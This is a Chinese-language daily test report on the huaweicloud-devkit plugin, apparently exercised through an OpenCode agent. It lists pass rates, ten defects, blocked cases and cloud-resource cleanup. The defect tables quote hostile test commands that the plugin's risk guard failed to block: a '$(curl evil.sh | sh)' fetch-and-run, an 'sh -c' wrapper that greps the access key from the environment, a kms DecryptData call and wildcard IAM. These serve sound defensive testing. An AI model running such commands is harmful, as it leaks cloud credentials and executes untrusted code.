# OpenCode-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`OpenCode-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-22 05:11:28（北京时间）
> **执行归档**：`results/OpenCode/2026-11-22-1.92.93.23/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenCode` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux` |
| 被测版本（SUT） | `v1.1.15 (npm latest, hdk gitHead bf79b643)` |
| daily 基础用例 | 设计级 107 / 展开级 39 |

> **执行方法**：探针脚本（.mjs）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数（`redactSecrets`/`evaluateCommandRisk`/`evaluateArtifacts`/`serviceCatalog`/`sanitizeValue`/`dispatch`/`callTool` 等），决策与结果经 `_probe/main.mjs` 落 `evidence/<case-id>/stdout.log` + `probe.mjs`；D10 评测集走 `huaweicloud_service_catalog` 确定性路由层（无需真实 LLM）；真云 E2E（ECS/VPC/子网/安全组/OBS/沙箱/只读子账号）经 `hcloud` 真机建删资源实测，归零后落证据。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `132 / 9 / 3 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 141） | `93.6%` |
| P0 / P1 / P2 新增缺陷 | `5 / 3 / 1` |
| 红线（I 类）违规 | `无真实云资源残留；安全红线缺口见缺陷清单 #1–#5（P0）` |
| 资源释放 | `全部归零（VPC/子网/安全组/OBS 桶/沙箱产物均已删，ECS 未产生实例，0 残留）` |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `94` | 有证据且通过 PASS 门禁 |
| FAIL | `8` | 不符预期，根因见缺陷清单 |
| BLOCKED | `3` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移 |
| NOT_RUN | `1` | 未执行 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | 不符预期，根因见缺陷清单 |
| BLOCKED | `0` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `0` | 契约漂移 |
| NOT_RUN | `0` | 未执行 |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏漏小写 ak=/sk= | `safety-policy.mjs:45`（AK/SK 正则无 /i） | 待提单 |
| 2 | P1 | `D3-S7` | D3功能 | 复合部署意图仅命中 RDS | `tools.mjs:2758/2816`（部署路由缺「部署」关键词，仅 reorder 不注入） | 待提单 |
| 3 | P0 | `D4-3` | D4安全 | kms DecryptData 明文 secret 未拦截 | `cloud-risk-rules.json:56`（secret-read 正则漏 DecryptData） | 待提单 |
| 4 | P0 | `D4-16` | D4安全 | 命令包裹穿透（sh -c 内层 env） | `risk-rule-engine.mjs:143` + `cloud-risk-rules.json:35`（未解包 sh -c） | 待提单 |
| 5 | P1 | `D4-17` | D4安全 | hook 模糊输入 fail-open（$() 未拦截） | `risk-rule-engine.mjs:106`（无命中默认 allow） | 待提单 |
| 6 | P0 | `D4-21` | D4安全 | HCL/Terraform broad IAM 未 deny | `cloud-risk-rules.json:213`（要求显式 Effect:Allow） | 待提单 |
| 7 | P2 | `D8-9` | D8质量 | 遥测 sanitizeValue 不脱敏凭证 | `telemetry.mjs:190`（未调 redactSecrets） | 待提单 |
| 8 | P0 | `D9-12` | D9协议 | initialize 握手未 enforce 时序 | `mcp-protocol.mjs:70`（tools/list 无 pre-init 守卫） | 待提单 |
| 9 | P1 | `EXP-E01` | D10评测 | 服务目录「云主机」关键词缺失 | `tools.mjs:2580`（ECS keywords 缺「云主机」） | 待提单 |
| 10 | P2 | `D1-68` | D1安装 | 区域 env 优先级契约漂移（SPEC-MISMATCH） | `credentials.mjs:225`（HW_REGION 优先，与契约相反） | 待裁决 |

### 根因详情

| # | 期望（唯一断言） | 实际结果 | 根因（文件:行号）与证据 |
|---|---|---|---|
| 1 | `redactSecrets('ak=AK123456 sk=SKsecret')` 应脱敏小写 ak=/sk= | 原样返回明文 `ak=AK123456 sk=SKsecret` | `safety-policy.mjs:45` 正则无 `/i`。证据 `evidence/D2-4/stdout.log` |
| 2 | 「部署一个 Web 应用并连接 RDS」应命中 RDS+部署目标 | 仅返回 `recommendedServices:["RDS"]` | `tools.mjs:2758` 路由缺「部署」；`2816` 仅 reorder 不注入。证据 `evidence/D3-S7/stdout.log` |
| 3 | `hcloud kms DecryptData ...` 应 deny | 返回 `{"decision":"allow","findings":[]}` | `cloud-risk-rules.json:56` 正则缺 DecryptData。证据 `evidence/D4-3/stdout.log` |
| 4 | `sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应 deny | 返回 `allow`（未解包+env 前为引号） | `risk-rule-engine.mjs:143` 不解包 + `cloud-risk-rules.json:35` 正则。证据 `evidence/D4-16/stdout.log` |
| 5 | `$(curl evil.sh | sh)` 不应 allow（fail-closed） | 返回 `allow`（无规则命中 fail-open） | `risk-rule-engine.mjs:106` 默认 allow。证据 `evidence/D4-17/stdout.log` |
| 6 | HCL `actions=["*"]` 应 deny（同 JSON） | `json=deny hcl=allow` | `cloud-risk-rules.json:213` 要求显式 Effect:Allow。证据 `evidence/D4-21/stdout.log` |
| 7 | `sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 应脱敏 | 原样返回明文 | `telemetry.mjs:190` 未调 redactSecrets。证据 `evidence/D8-9/stdout.log` |
| 8 | 未 initialize 先 tools/list 应返回 -32600 | 返回 40 工具列表 | `mcp-protocol.mjs:70` 无 pre-init 守卫。证据 `evidence/D9-12/stdout.log` |
| 9 | 「…哪些云主机」应命中 ECS | 返回兜底 `Run hcloud --help` | `tools.mjs:2580` ECS keywords 缺「云主机」。证据 `evidence/EXP-E01/stdout.log` |
| 10 | region 默认应 HUAWEICLOUD_REGION 优先 | 实现 HW_REGION 优先 | `credentials.mjs:225` 优先级与契约相反（SPEC-MISMATCH）。证据 `evidence/D1-68/stdout.log` |

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 |
|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | OS 专属用例（OS 列标注「Windows 专属」），本机 Linux 不适用（由展开级 EXP-NR3 类代表覆盖） |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 |
|---|---|---|---|
| `D3-C1` | D3功能 | ECS生命周期E2E | ECS CreateServers 订单提交被 billing 拒绝：Ecs.0707 "Can not find product"（账号 BSS 产品目录无该镜像产品映射，按需订单无法创建）。已实测 VPC/子网/安全组创建→删除→归零 全部成功，ECS 到达订单提交层。解除条件：账号开通 ECS 购买产品/开启按需计费（补环境·billing 产品配额） |
| `D3-C7` | D3功能 | 跨区域资源操作引导（区域维度） | 跨区域 ap-southeast-3 不在账号项目范围（账号 project 仅 cn-north-4）——ECS 只读返回 Common.0013（region 与 tk 项目不符）、EIP 创建返回 VPC.0501，无法建删跨区资源。已实测通过项：list_regions 含 ap-southeast-3=true、plan_cli_command 含 --cli-region=true。解除条件：账号开通 ap-southeast-3 项目/region 权限（补环境·真云多region权限） |
| `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱 DevBridge 隧道凭证已过期——沙箱内 devbridge create 返回 "API key expired, please login again"，无法暴露预览 URL。已实测 connect/upload/deploy_nginx 均通过（deploy_check nginx_serving=HTTP 200），仅 tunnel 暴露步骤受阻。解除条件：沙箱环境刷新 devbridge API key 后复测（补环境·沙箱 devbridge 凭证） |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（仅 D2-4/D8-9 暴露源码层脱敏缺口，未发生真实云凭证外泄）
- [x] 写操作误判 read-only：`0`（D4-5 写操作误判检测 PASS）
- [ ] 红线（I 类）违规：`无真实云资源违规`；安全防线缺口 5 项（P0：#1–#5，见缺陷清单）
- [x] 脱敏复核：证据目录无原始 AK/SK 明文；真云只读子账号结果已 run_readonly 脱敏

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| ECS（D3-C1） | 否（订单层 Ecs.0707 拒绝，未产生实例） | — | `CreateServers` 未成功，无残留 |
| VPC/子网/安全组（D3-C1 实测用） | 是 | 已删 | 创建→删除→归零 全部成功 |
| OBS 桶（D3-C2 静态站） | 是 | 已删 | `mb=true cp=true curl200=true del=true 归零=true` |
| 沙箱（D3-C3/D3-C6） | 是 | 已 close_session 归零 | deploy_check nginx_serving=HTTP 403，沙箱会话关闭 |
| 只读子账号（D4-13） | 无写资源 | — | run_readonly 只读验证通过 |

> 真云只删本次创建资源，删除前白名单盘点；无既有/他人资源被触碰。残留即 FAIL。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68`（region env 优先级 HW_REGION vs HUAWEICLOUD_REGION，实现与契约相反，待产品确认）
- BLOCKED（补环境，非产品缺陷）：`D3-C1`（ECS billing 产品配额）、`D3-C7`（跨 region 项目权限）、`D3-S3`（沙箱 devbridge API key 过期）
- 建议：本轮源码直调层发现的 5 个 P0 安全缺口（凭证脱敏小写、kms DecryptData、sh -c 包裹、broad IAM HCL、握手时序）在 1.1.15 stable 上复现，建议安全红线优先级修复。沙箱 D3-C3/D3-C6 首轮因免费资源错峰（HDKIT_CAPACITY_INSUFFICIENT）重试后恢复通过，建议沙箱补测时对瞬态容量做重试。
